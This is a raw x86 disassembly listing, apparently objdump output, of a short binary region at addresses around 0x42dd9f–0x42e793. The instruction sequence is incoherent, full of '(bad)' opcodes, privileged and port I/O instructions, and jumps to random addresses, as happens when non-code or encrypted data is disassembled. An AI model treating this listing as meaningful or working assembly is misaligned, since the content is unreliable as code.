  42dd9f:	into   
  42dda0:	inc    ebx
  42dda1:	mov    bl,0x7d
  42dda3:	test   eax,0x9f5d6064
  42dda8:	dec    esp
  42dda9:	mov    ds,WORD PTR [eax+esi*8]
  42ddac:	push   ss
  42ddad:	fdivr  st,st(3)
  42ddaf:	pop    edi
  42ddb0:	stc    
  42ddb1:	xor    eax,0x2a0c8c
	...
  42de16:	out    0x82,al
  42de18:	lods   eax,DWORD PTR ds:[esi]
  42de19:	xor    ebp,ebp
  42de1b:	aas    
  42de1c:	(bad)  
  42de1d:	xlat   BYTE PTR ds:[ebx]
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0xb7ff2107
  42de25:	cld    
  42de26:	sub    bl,0x1
  42de29:	add    BYTE PTR [edi],al
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    BYTE PTR [edi],cl
  42de2f:	ret    0x648d
  42de32:	enter  0x956f,0x4
  42de36:	sahf   
  42de37:	or     BYTE PTR [eax+ebx*1+0x6e],bl
  42de3b:	jge    0x42de2a
  42de3d:	cmp    ch,dh
  42de3f:	lahf   
  42de40:	int    0x79
  42de42:	dec    esp
  42de43:	jge    0x42de3c
  42de45:	jns    0x42de28
  42de47:	and    eax,0x7550848a
  42de4c:	in     eax,dx
  42de4d:	inc    esp
  42de4e:	mov    esp,0xdda396a5
  42de53:	adc    al,0x95
  42de55:	sub    dh,BYTE PTR [esi+0x6706f266]
  42de5b:	fdivrp st(0),st
  42de5d:	pop    edx
  42de5e:	mov    edx,fs
  42de60:	loop   0x42de6a
  42de62:	dec    edx
  42de63:	std    
  42de64:	scas   eax,DWORD PTR es:[edi]
  42de65:	fisubr DWORD PTR [eax-0x368b3846]
  42de6b:	stc    
  42de6c:	add    DWORD PTR [ebx],0xca978db8
  42de72:	loopne 0x42de30
  42de74:	dec    ebp
  42de75:	mov    al,0x2b
  42de77:	adc    ah,0xc
  42de7a:	inc    esi
  42de7b:	fldcw  WORD PTR [ebp+0x8f83f59]
  42de81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de82:	int3   
  42de83:	out    0x81,eax
  42de85:	push   edx
  42de86:	imul   eax,DWORD PTR [ecx],0xffffffab
  42de89:	repz dec ebp
  42de8b:	xchg   ebx,eax
  42de8c:	pop    edx
  42de8d:	or     esi,0x18a3d377
  42de93:	jle    0x42de16
  42de95:	mov    esp,0xf520e120
  42de9a:	jecxz  0x42de4a
  42de9c:	out    0xf6,al
  42de9e:	ss dec edx
  42dea0:	test   al,0x5c
  42dea2:	add    ecx,edi
  42dea4:	imul   ebp,DWORD PTR [edi-0xe413959],0x34f87764
  42deae:	add    ebp,DWORD PTR [eax-0x6383dd05]
  42deb4:	(bad)  
  42deb5:	vsubps xmm2,xmm4,XMMWORD PTR [ecx]
  42deb9:	cmp    BYTE PTR [ebp+0x35038b3b],ah
  42debf:	push   es
  42dec0:	mov    bl,bh
  42dec2:	xchg   ecx,eax
  42dec3:	dec    esp
  42dec4:	dec    eax
  42dec5:	mov    bl,0x68
  42dec7:	pop    ecx
  42dec8:	cld    
  42dec9:	xchg   ebx,eax
  42deca:	push   ecx
  42decb:	mov    dh,0x7e
  42decd:	clc    
  42dece:	sbb    edi,edi
  42ded0:	(bad)  
  42ded1:	cld    
  42ded2:	xchg   ecx,eax
  42ded3:	neg    DWORD PTR [ecx]
  42ded5:	inc    edi
  42ded6:	fwait
  42ded7:	lods   eax,DWORD PTR ds:[esi]
  42ded8:	(bad)  
  42ded9:	or     ch,BYTE PTR [ebx-0x40d1641e]
  42dedf:	dec    ebp
  42dee0:	(bad)  
  42dee1:	ss js  0x42decd
  42dee4:	popf   
  42dee5:	xor    al,0xc2
  42dee7:	sar    DWORD PTR [eax+0xf7fcd7b],1
  42deed:	xchg   esp,eax
  42deee:	cmp    dl,BYTE PTR [esi+0x5e5a5fe1]
  42def4:	pop    esp
  42def5:	and    dl,BYTE PTR [eax+0x7be7fb8c]
  42defb:	xchg   ebx,eax
  42defc:	mov    ds:0x1772ff87,al
  42df01:	mov    dl,BYTE PTR [ebp-0x7fb8f40a]
  42df07:	jmp    0x657894c0
  42df0c:	xor    DWORD PTR [esi+0x4],esi
  42df0f:	or     eax,0x3d5634bf
  42df14:	inc    eax
  42df15:	loopne 0x42df91
  42df17:	adc    eax,0xf0182673
  42df1c:	adc    BYTE PTR [edi],dl
  42df1e:	bnd jge 0x42df41
  42df21:	mov    dh,0x45
  42df23:	(bad)  
  42df25:	push   edi
  42df26:	ss loopne 0x42df82
  42df29:	and    DWORD PTR [ecx+0x53],esi
  42df2c:	ja     0x42df5d
  42df2e:	aaa    
  42df2f:	inc    edx
  42df30:	dec    ebx
  42df31:	fidiv  DWORD PTR [ebx]
  42df33:	add    BYTE PTR [eax+eax*1+0x0],cl
	...
  42df93:	add    BYTE PTR [eax],al
  42df95:	add    BYTE PTR [edx],al
  42df97:	(bad)  
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	mov    BYTE PTR ds:0xec879f8d,ch
  42dfa8:	add    DWORD PTR [eax],eax
  42dfaa:	pop    es
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    BYTE PTR [edi+0x6a],ah
  42dfb0:	fnstcw WORD PTR [esi]
  42dfb2:	out    dx,eax
  42dfb3:	test   dl,dh
  42dfb5:	mov    bl,0x3e
  42dfb7:	fbstp  TBYTE PTR ds:0xa38bebfe
  42dfbd:	test   edx,esp
  42dfbf:	fwait
  42dfc0:	arpl   WORD PTR [ecx+ecx*4-0x40],bp
  42dfc4:	lock pop esi
  42dfc6:	imul   ecx,esi,0xffffff95
  42dfc9:	ja     0x42df6f
  42dfcb:	adc    al,0xdb
  42dfcd:	imul   esi,ecx,0x70
  42dfd0:	push   ds
  42dfd1:	push   ebx
  42dfd2:	(bad)  
  42dfd4:	mov    ebp,0xc170b95e
  42dfd9:	pop    ebp
  42dfda:	pop    edx
  42dfdb:	dec    eax
  42dfdc:	repnz dec edi
  42dfde:	push   eax
  42dfdf:	loopne 0x42e003
  42dfe1:	icebp  
  42dfe2:	jle    0x42df9c
  42dfe4:	ret    
  42dfe5:	stc    
  42dfe6:	push   ecx
  42dfe7:	jbe    0x42df88
  42dfe9:	icebp  
  42dfea:	enter  0x924b,0xf9
  42dfee:	(bad)  
  42dfef:	scas   al,BYTE PTR es:[edi]
  42dff0:	push   ds
  42dff1:	fmul   QWORD PTR [ecx+0x56800297]
  42dff7:	adc    BYTE PTR [ebx-0x26],ch
  42dffa:	shl    BYTE PTR [ebx+edx*1+0x6b],0xb0
  42dfff:	cdq    
  42e000:	cmp    eax,0xab8b8be6
  42e005:	shl    BYTE PTR [ebx+0x4ccafc8a],cl
  42e00b:	ins    DWORD PTR es:[edi],dx
  42e00c:	mov    ch,0xa2
  42e00e:	rdmsr  
  42e010:	pop    ss
  42e011:	jge    0x42e01f
  42e013:	push   ds
  42e014:	jecxz  0x42dfff
  42e016:	jmp    0x42e092
  42e018:	repnz and esp,ebp
  42e01b:	adc    al,0x8e
  42e01d:	rcr    ah,0x58
  42e020:	pusha  
  42e021:	jno    0x42e00e
  42e023:	outs   dx,BYTE PTR ds:[esi]
  42e024:	frstor [edi-0x8]
  42e027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e028:	fsubr  st,st(1)
  42e02a:	fidiv  WORD PTR [eiz*1+0x2a9faddb]
  42e031:	jecxz  0x42e07a
  42e033:	repnz xchg esi,eax
  42e035:	mov    edi,0x67b6aa6c
  42e03a:	out    0x55,al
  42e03c:	cmp    BYTE PTR [edx+eiz*4],dl
  42e03f:	es jp  0x42e04f
  42e042:	ss mov esi,0x2d2a746a
  42e048:	ins    DWORD PTR es:[edi],dx
  42e049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e04a:	pop    eax
  42e04b:	leave  
  42e04c:	sbb    dh,dl
  42e04e:	outs   dx,DWORD PTR ds:[esi]
  42e04f:	(bad)  
  42e050:	iret   
  42e051:	inc    ebp
  42e052:	fmul   DWORD PTR [edx-0x5fcf3896]
  42e058:	jbe    0x42e046
  42e05a:	adc    al,0x90
  42e05c:	cmp    al,0xd1
  42e05e:	mov    al,ds:0xf527da11
  42e063:	rcl    eax,1
  42e065:	inc    BYTE PTR [ebx]
  42e067:	push   esp
  42e068:	jecxz  0x42e0a2
  42e06a:	pop    edi
  42e06b:	push   edi
  42e06c:	je     0x42dff6
  42e06e:	pop    ebx
  42e06f:	xor    al,0x67
  42e071:	jle    0x42e04d
  42e073:	out    dx,eax
  42e074:	mov    ds:0x314e5a10,eax
  42e079:	add    BYTE PTR [esi-0x21a21d52],dh
  42e07f:	gs sbb eax,0xc789cbb
  42e085:	dec    esi
  42e086:	and    eax,0x4afd0061
  42e08b:	mov    al,BYTE PTR [ecx]
  42e08d:	lods   eax,DWORD PTR cs:[esi]
  42e08f:	aam    0x5e
  42e091:	cli    
  42e092:	fs inc ecx
  42e094:	mov    dh,0x70
  42e096:	(bad)  [edx+0x6d259d15]
  42e09c:	jne    0x42e10c
  42e09e:	inc    ebx
  42e09f:	and    al,0xe1
  42e0a1:	dec    esp
  42e0a2:	bound  ebp,QWORD PTR fs:0x3becbab2
  42e0a9:	repnz pop ebp
  42e0ab:	mov    esp,0xbfbbe307
  42e0b0:	pop    ds
  42e0b1:	mov    esp,0xa1dd11
	...
  42e116:	mov    eax,ds:0x7e061ecf
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	cwde   
  42e123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e124:	push   ss
  42e125:	pushf  
  42e126:	mov    gs,ebp
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    BYTE PTR [edi],dl
  42e12f:	sti    
  42e130:	mov    ah,ch
  42e132:	inc    edx
  42e133:	jle    0xadb081d4
  42e139:	push   es
  42e13a:	stos   BYTE PTR es:[edi],al
  42e13b:	add    al,0xa2
  42e13d:	mov    bl,0x8d
  42e13f:	add    eax,0xb8c10f0
  42e144:	in     eax,0xe
  42e146:	fiadd  WORD PTR [esp+ebp*2+0x1275183a]
  42e14d:	adc    BYTE PTR [edi],0x52
  42e150:	out    0x16,al
  42e152:	mov    esp,0xe004d00c
  42e157:	daa    
  42e158:	push   0xebc7af5e
  42e15d:	jo     0x42e13e
  42e15f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e160:	inc    DWORD PTR [edi+0xc148162]
  42e166:	loop   0x42e1ad
  42e168:	jbe    0x42e1d2
  42e16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e16b:	out    0xb,eax
  42e16d:	mov    BYTE PTR [eax-0x4857ef8c],dl
  42e173:	xchg   esi,eax
  42e174:	cwde   
  42e175:	aas    
  42e176:	cmp    ah,BYTE PTR [eax]
  42e178:	inc    eax
  42e179:	add    ch,BYTE PTR [ebp-0x45]
  42e17c:	lods   eax,DWORD PTR ds:[esi]
  42e17d:	add    al,0x5d
  42e17f:	sub    eax,0xad572d21
  42e184:	push   ebx
  42e185:	loop   0x42e16f
  42e187:	mov    ah,0xf4
  42e189:	cmp    eax,0x7156d3fa
  42e18e:	and    al,0x7b
  42e190:	pop    es
  42e191:	push   edx
  42e192:	iret   
  42e193:	pop    edi
  42e194:	pop    esp
  42e195:	xchg   ebp,eax
  42e196:	loope  0x42e1db
  42e198:	imul   esp,DWORD PTR [esi+ecx*4-0x5e],0x36b5998b
  42e1a0:	adc    eax,0xe83b6cab
  42e1a5:	jmp    0x46e0aa05
  42e1aa:	push   edi
  42e1ab:	aas    
  42e1ac:	xor    ebx,DWORD PTR [eax+0x328049da]
  42e1b2:	add    ch,BYTE PTR [edx+0x6f]
  42e1b5:	mov    ds:0xeab1762,eax
  42e1ba:	sbb    dh,BYTE PTR [eax]
  42e1bc:	add    cl,cl
  42e1be:	mov    edx,0x28922c7a
  42e1c3:	lahf   
  42e1c4:	inc    ebp
  42e1c5:	cmp    al,0x97
  42e1c7:	or     ecx,esp
  42e1c9:	mov    DWORD PTR [edx],eax
  42e1cb:	cmp    al,0xd
  42e1cd:	icebp  
  42e1ce:	sub    esi,ebx
  42e1d0:	sbb    dl,cl
  42e1d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e1d3:	in     al,0xd7
  42e1d5:	call   0xc003:0xcc725651
  42e1dc:	repz push esp
  42e1de:	mov    ds:0x6daf7728,al
  42e1e3:	in     al,dx
  42e1e4:	enter  0x3312,0xbf
  42e1e8:	push   eax
  42e1e9:	xor    al,0xfb
  42e1eb:	xchg   ebp,eax
  42e1ec:	popa   
  42e1ed:	ficomp WORD PTR [edx]
  42e1ef:	pop    eax
  42e1f0:	stc    
  42e1f1:	(bad)  
  42e1f2:	icebp  
  42e1f3:	shr    BYTE PTR [eax+0x51],0x78
  42e1f7:	(bad)  
  42e1f8:	imul   esi,ecx,0x2
  42e1fb:	sbb    eax,0x80033738
  42e200:	outs   dx,DWORD PTR ds:[esi]
  42e201:	cld    
  42e202:	das    
  42e203:	stos   BYTE PTR es:[edi],al
  42e204:	xchg   BYTE PTR [edx+0x6e53e010],cl
  42e20a:	add    BYTE PTR [eax],al
  42e20c:	lahf   
  42e20d:	or     al,0x82
  42e20f:	pop    ds
  42e210:	(bad)  
  42e211:	adc    DWORD PTR [esi-0x5f],esp
  42e214:	mov    eax,DWORD PTR [esi]
  42e216:	mov    esi,esp
  42e218:	dec    ecx
  42e219:	sbb    ebp,esp
  42e21b:	cmp    esi,esi
  42e21d:	pop    ds
  42e21e:	aam    0x7
  42e220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e221:	or     dl,cl
  42e223:	call   0xee10:0xb02a0ebc
  42e22a:	push   edx
  42e22b:	(bad)  
  42e22c:	xchg   ebx,eax
  42e22d:	cmp    al,0x51
  42e22f:	adc    esi,eax
  42e231:	push   ss
  42e232:	shr    DWORD PTR [ebx],1
  42e234:	jb     0x42e236
	...
  42e296:	lods   eax,DWORD PTR ds:[esi]
  42e297:	cmp    eax,0xb79aa78a
  42e29c:	lods   eax,DWORD PTR ds:[esi]
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0xb2fd0ff2
  42e2a5:	fcom   DWORD PTR [ebp+0x70001ee]
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    BYTE PTR [ebp-0x2a],cl
  42e2b0:	std    
  42e2b1:	xor    bl,ch
  42e2b3:	pop    esi
  42e2b4:	jns    0x42e30c
  42e2b6:	out    dx,eax
  42e2b7:	imul   esp,DWORD PTR [ebp-0x19],0xffffffe3
  42e2bb:	jns    0x42e274
  42e2bd:	push   ebp
  42e2be:	ss jmp 0x85516218
  42e2c4:	test   al,bl
  42e2c6:	imul   ebp,ebp,0x448c6af4
  42e2cc:	pop    ds
  42e2cd:	mov    ecx,0xfdde511e
  42e2d2:	and    BYTE PTR [eax+0x1d],ah
  42e2d5:	jl     0x42e286
  42e2d7:	into   
  42e2d8:	pop    edi
  42e2d9:	imul   eax,DWORD PTR ds:0x4a2aa07b,0x56d009c3
  42e2e3:	cmp    al,0x38
  42e2e5:	or     dl,bl
  42e2e7:	sub    ebp,ebp
  42e2e9:	jne    0x42e328
  42e2eb:	cwde   
  42e2ec:	xchg   DWORD PTR [eax+0x27],ecx
  42e2ef:	sar    DWORD PTR [esi-0xd],0x12
  42e2f3:	(bad)  
  42e2f4:	mov    ch,0x44
  42e2f6:	or     al,0x40
  42e2f8:	mov    DWORD PTR [edx],ebx
  42e2fa:	push   edx
  42e2fb:	je     0x42e325
  42e2fd:	(bad)  
  42e2fe:	imul   edi,DWORD PTR [esi],0x976f43ee
  42e304:	sbb    eax,0xbf92c36e
  42e309:	out    0xee,eax
  42e30b:	jne    0x42e2f2
  42e30d:	or     ch,BYTE PTR [ecx+esi*4-0x3729ad15]
  42e314:	and    DWORD PTR [esi],edi
  42e316:	bnd jne 0x42e37a
  42e319:	loope  0x42e31a
  42e31b:	out    0xa5,al
  42e31d:	or     BYTE PTR [esi],ch
  42e31f:	iret   
  42e320:	push   es
  42e321:	adc    ebp,0xffffffba
  42e324:	pop    DWORD PTR [ebx]
  42e326:	or     BYTE PTR [ebp-0x77d1136a],0x32
  42e32d:	dec    edx
  42e32e:	inc    ebx
  42e32f:	repz das 
  42e331:	mov    DWORD PTR [esi-0x2c],ecx
  42e334:	dec    esi
  42e335:	call   0x7f442067
  42e33a:	mov    edx,0x46de27e9
  42e33f:	mov    bh,0xfb
  42e341:	and    esi,DWORD PTR [esi+0x53]
  42e344:	popf   
  42e345:	push   esi
  42e346:	fadd   st(2),st
  42e348:	lea    ebp,[edi]
  42e34a:	push   0x47
  42e34c:	addr16 and al,0xc0
  42e34f:	cs add al,0x1e
  42e352:	xor    DWORD PTR [edi+0x7989c00e],ebx
  42e358:	cmpxchg DWORD PTR [ebx+0x77ee489a],eax
  42e35f:	ret    
  42e360:	inc    eax
  42e361:	dec    esp
  42e363:	xor    DWORD PTR [edx+eiz*1],edx
  42e366:	adc    BYTE PTR [ebp+0x3a],dl
  42e369:	aam    0x27
  42e36b:	jns    0x42e37d
  42e36d:	loope  0x42e3d3
  42e36f:	lock xor BYTE PTR [esi-0x57],al
  42e373:	retf   0xb2fd
  42e376:	mov    ecx,0xb84e5a0a
  42e37b:	out    0x19,eax
  42e37d:	jmp    0x42e3b2
  42e37f:	xchg   esi,eax
  42e380:	mov    al,0x2
  42e382:	push   esi
  42e383:	scas   eax,DWORD PTR es:[edi]
  42e384:	cmp    bh,BYTE PTR [ebx-0x3a7129aa]
  42e38a:	inc    ebp
  42e38b:	dec    ecx
  42e38c:	int3   
  42e38d:	out    0xb2,eax
  42e38f:	pop    esp
  42e390:	shl    ebx,0x51
  42e393:	dec    esp
  42e394:	pushf  
  42e395:	push   0x66
  42e397:	gs jg  0x42e338
  42e39a:	(bad)  
  42e39b:	in     eax,dx
  42e39c:	scas   al,BYTE PTR es:[edi]
  42e39d:	dec    ecx
  42e39e:	mov    cl,0x30
  42e3a0:	jl     0x42e375
  42e3a2:	into   
  42e3a3:	ins    BYTE PTR es:[edi],dx
  42e3a4:	mov    al,0x34
  42e3a6:	add    BYTE PTR [ebx-0x7c],0x2d
  42e3aa:	and    al,BYTE PTR [ebx+ecx*4]
  42e3ad:	je     0x42e3a2
  42e3af:	fwait
  42e3b0:	lea    ebx,[ecx-0x1e]
  42e3b3:	pop    ebp
  42e3b4:	mov    al,ds:0x0
	...
  42e415:	add    dl,ah
  42e417:	mov    ebp,0xe7dfc7dc
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	lods   eax,DWORD PTR ds:[esi]
  42e423:	jmp    0x1:0xef9c1f06
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    cl,ch
  42e42f:	sub    esi,DWORD PTR [eax+0x7d]
  42e432:	and    BYTE PTR [ebp-0x15dd5976],cl
  42e438:	push   0xd4262a38
  42e43d:	ror    ax,0x7e
  42e441:	lds    edi,FWORD PTR [ebx-0x5098596f]
  42e447:	ins    DWORD PTR es:[edi],dx
  42e448:	mov    eax,ds:0xd01678ed
  42e44d:	or     al,0x3e
  42e44f:	shr    DWORD PTR [eax-0x4b4206a7],cl
  42e455:	dec    esp
  42e456:	ss xor cl,bh
  42e459:	ret    
  42e45a:	fwait
  42e45b:	add    eax,0xc40aac60
  42e460:	retf   
  42e461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e462:	daa    
  42e463:	cmp    al,0xc3
  42e465:	fadd   st(0),st
  42e467:	push   cs
  42e468:	or     BYTE PTR [edx],ch
  42e46a:	icebp  
  42e46b:	or     BYTE PTR ds:0x23603f5e,ah
  42e471:	cmp    al,0xef
  42e473:	loop   0x42e4dc
  42e475:	es dec ebx
  42e477:	sub    esp,esi
  42e479:	push   ecx
  42e47a:	xor    DWORD PTR [edi+0x64],esp
  42e47d:	(bad)
  42e482:	lea    eax,[edi]
  42e484:	jmp    0x42e423
  42e486:	repz mov ebp,0xe760698e
  42e48c:	ret    0xca5b
  42e48f:	mul    BYTE PTR [eax-0x32]
  42e492:	adc    ah,BYTE PTR ds:[ebp-0x3d0b33f]
  42e499:	es icebp 
  42e49b:	cmc    
  42e49c:	add    al,0xbd
  42e49e:	add    BYTE PTR [ebx],0x49
  42e4a1:	mov    ah,0xaf
  42e4a3:	das    
  42e4a4:	ret    0x9b5
  42e4a7:	mov    bl,0xf9
  42e4a9:	and    ah,BYTE PTR [edi+ecx*1-0x7f85fd90]
  42e4b0:	cwde   
  42e4b1:	mov    dh,0xb3
  42e4b3:	daa    
  42e4b4:	clc    
  42e4b5:	adc    eax,0xbd2f1a85
  42e4ba:	add    edx,ecx
  42e4bc:	push   esp
  42e4bd:	repnz test al,0x36
  42e4c0:	mov    ah,0x49
  42e4c2:	(bad)  
  42e4c3:	retf   
  42e4c4:	aaa    
  42e4c5:	add    esp,eax
  42e4c7:	lods   al,BYTE PTR ds:[esi]
  42e4c8:	mov    ebx,0xb69178ce
  42e4cd:	sub    esi,DWORD PTR [ebx+eiz*2]
  42e4d0:	adc    eax,0x5fe30a0b
  42e4d5:	sub    al,0xd0
  42e4d7:	dec    edx
  42e4d8:	adc    eax,DWORD PTR [eax+esi*1+0x1]
  42e4dc:	mov    ebp,0xbeacd67a
  42e4e1:	js     0x42e46c
  42e4e3:	or     eax,0xe14677c8
  42e4e8:	fnstenv [ecx-0x7b7aeb1c]
  42e4ee:	sti    
  42e4ef:	mov    eax,ds:0xbf6d44bb
  42e4f4:	sbb    al,0x5e
  42e4f6:	sbb    ebx,DWORD PTR [eax]
  42e4f8:	or     DWORD PTR [esi-0x2a816bc4],esp
  42e4fe:	aaa    
  42e4ff:	pop    ss
  42e500:	push   ecx
  42e501:	popa   
  42e502:	in     al,0xf7
  42e504:	push   esi
  42e505:	mov    bl,0x2f
  42e507:	shl    ecx,cl
  42e509:	or     edi,DWORD PTR [ebp+0xca8ec86]
  42e50f:	add    esp,ebx
  42e511:	out    dx,eax
  42e512:	leave  
  42e513:	dec    edi
  42e514:	jp     0x42e4cc
  42e516:	sbb    eax,0xabf81893
  42e51b:	mov    fs,WORD PTR [ebx+esi*2+0x6fd11a69]
  42e522:	les    esi,FWORD PTR [eax-0x5b]
  42e525:	popf   
  42e526:	jne    0x42e55e
  42e528:	mov    cl,bl
  42e52a:	add    BYTE PTR [edi+0x77],dh
  42e52d:	sti    
  42e52e:	je     0x42e508
  42e530:	les    edx,FWORD PTR [ecx+ebp*2+0x3e]
  42e534:	push   edx
	...
  42e595:	add    BYTE PTR [ebp+0x38],dl
  42e598:	into   
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	je     0x42e5e6
  42e5a4:	pop    ecx
  42e5a5:	xchg   esi,eax
  42e5a6:	mov    ds:0x70001f0,eax
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    BYTE PTR [eax],bh
  42e5af:	pop    ss
  42e5b0:	xchg   ecx,eax
  42e5b1:	push   es
  42e5b2:	gs add ch,bl
  42e5b5:	(bad)  
  42e5b6:	cmc    
  42e5b7:	add    edi,esp
  42e5b9:	nop
  42e5ba:	std    
  42e5bb:	(bad)  
  42e5bc:	mov    bh,0xff
  42e5be:	in     eax,dx
  42e5bf:	add    ebp,DWORD PTR [esi]
  42e5c1:	add    BYTE PTR [edi],cl
  42e5c3:	push   0x855927e3
  42e5c8:	xchg   DWORD PTR [ebx+0x4a],edi
  42e5cb:	jae    0x42e55d
  42e5cd:	xor    ah,ah
  42e5cf:	lea    ebp,[esi+ebp*4-0x8a84dce]
  42e5d6:	xchg   ecx,eax
  42e5d7:	xchg   DWORD PTR [eax+ebp*8-0x5f6a6699],esi
  42e5de:	mov    cl,0xec
  42e5e0:	int3   
  42e5e1:	mov    DWORD PTR [edi],ebp
  42e5e3:	dec    BYTE PTR [ebp+0x6]
  42e5e6:	add    eax,0x1a67d78d
  42e5eb:	cli    
  42e5ec:	xchg   edi,eax
  42e5ed:	adc    al,0x77
  42e5ef:	(bad)  
  42e5f0:	loop   0x42e5cb
  42e5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5f3:	icebp  
  42e5f4:	pop    edx
  42e5f5:	pop    edi
  42e5f6:	es pop ebx
  42e5f8:	sub    al,0xcf
  42e5fa:	adc    BYTE PTR [edx+0x52b9849e],0xca
  42e601:	adc    eax,0x11d82fe1
  42e606:	lods   al,BYTE PTR ds:[esi]
  42e607:	test   al,0x20
  42e609:	int3   
  42e60a:	adc    BYTE PTR [edx],al
  42e60c:	mov    eax,ds:0xf660d680
  42e611:	cmp    BYTE PTR [eax+0x1f0a5b7a],bl
  42e617:	cld    
  42e618:	in     al,0xaa
  42e61a:	in     al,0x7b
  42e61c:	loop   0x42e5fb
  42e61e:	sbb    al,BYTE PTR [eax+0x72]
  42e621:	pusha  
  42e622:	and    ah,ch
  42e624:	dec    ebx
  42e625:	sub    BYTE PTR [edx-0x19],bh
  42e628:	repnz cli 
  42e62a:	push   edi
  42e62b:	aas    
  42e62c:	cmp    al,0xb2
  42e62e:	out    dx,al
  42e62f:	bound  edi,QWORD PTR [eax+0x9]
  42e632:	or     DWORD PTR [ebp-0xe6e4f5c],esi
  42e638:	fdivr  QWORD PTR [ebx]
  42e63a:	mov    BYTE PTR [ecx+0x2c776f9e],bl
  42e640:	(bad)  
  42e641:	jmp    0x42e6a1
  42e643:	je     0x42e5e0
  42e645:	imul   ebx,ebp,0x43
  42e648:	or     eax,0x9bd47641
  42e64d:	pop    esi
  42e64e:	push   0xfffffffe
  42e650:	mov    al,0x40
  42e652:	inc    esp
  42e653:	jmp    0x761:0x840779c3
  42e65a:	push   ebx
  42e65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e65c:	mov    ah,0x84
  42e65e:	xor    BYTE PTR ds:0x6a247a56,dh
  42e664:	(bad)  
  42e665:	push   ecx
  42e666:	rcl    BYTE PTR [eax+0x2a],cl
  42e669:	push   cs
  42e66a:	xchg   esi,eax
  42e66b:	pop    es
  42e66c:	sar    bl,0x64
  42e66f:	mov    al,0x21
  42e671:	ret    
  42e672:	and    al,dl
  42e674:	cmp    edi,ebp
  42e676:	adc    al,BYTE PTR [ebx-0x71bc981]
  42e67c:	mul    dh
  42e67e:	mov    al,ds:0x5864a29a
  42e683:	jge    0x42e64e
  42e685:	fcom   QWORD PTR [ecx]
  42e687:	jns    0x42e6cd
  42e689:	jns    0x42e6bd
  42e68b:	xchg   esi,eax
  42e68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e68d:	push   0xffffff94
  42e68f:	sub    DWORD PTR [edx+0x66],0x12
  42e693:	loopne 0x42e6f6
  42e695:	mov    ebp,0x819b4471
  42e69a:	mov    eax,ebp
  42e69c:	pop    ecx
  42e69d:	push   ss
  42e69e:	rcr    BYTE PTR [edi+0xbc2c12],1
  42e6a4:	(bad)  
  42e6a5:	add    DWORD PTR [eax+ebx*4],ecx
  42e6a8:	sub    bh,BYTE PTR [ebx-0x6240cbff]
  42e6ae:	or     eax,DWORD PTR [eax-0x1f]
  42e6b1:	iret   
  42e6b2:	xor    DWORD PTR [ebx+0x6],0x0
	...
  42e716:	pop    edx
  42e717:	cmp    DWORD PTR [esi+0x2d],ecx
  42e71a:	outs   dx,DWORD PTR ds:[esi]
  42e71b:	jg     0x42e798
  42e71d:	jg     0x42e6cd
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	(bad)  
  42e723:	push   esi
  42e724:	int3   
  42e725:	sahf   
  42e726:	stos   BYTE PTR es:[edi],al
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [edx+eax*8-0x52],al
  42e731:	rcl    eax,0x26
  42e734:	mov    ch,0x4
  42e736:	(bad)  
  42e737:	adc    dl,BYTE PTR [ebp+0x31]
  42e73a:	ins    DWORD PTR es:[edi],dx
  42e73b:	jl     0x42e776
  42e73d:	jae    0x3303a0e
  42e743:	aam    0xb3
  42e745:	mov    cl,0x1c
  42e747:	mov    al,ds:0x141f42eb
  42e74c:	dec    ebp
  42e74d:	dec    eax
  42e74e:	xchg   ebp,eax
  42e74f:	push   ss
  42e750:	lahf   
  42e751:	std    
  42e752:	push   edi
  42e753:	cmp    DWORD PTR [ebx-0x26],edx
  42e756:	in     eax,0xd0
  42e758:	sbb    eax,0xeaf2ea85
  42e75d:	cmp    bh,bh
  42e75f:	mov    ebp,ecx
  42e761:	mov    al,0xe
  42e763:	dec    edx
  42e764:	mov    al,0x2
  42e766:	mov    ah,0xb
  42e768:	call   FWORD PTR [esi]
  42e76a:	(bad)  
  42e76b:	dec    edx
  42e76c:	sti    
  42e76d:	iret   
  42e76e:	mov    dl,0xed
  42e770:	push   edi
  42e771:	lea    eax,[esi+0x42061e19]
  42e777:	test   esp,0xb73a9dfc
  42e77d:	and    eax,0x8c8994b2
  42e782:	jp     0x42e7b9
  42e784:	adc    eax,0x6517dc30
  42e789:	mov    eax,ds:0xd32b1ddc
  42e78e:	sub    eax,0xef0b1494
  42e793:	add    BYTE PTR [ebp+0x47],cl
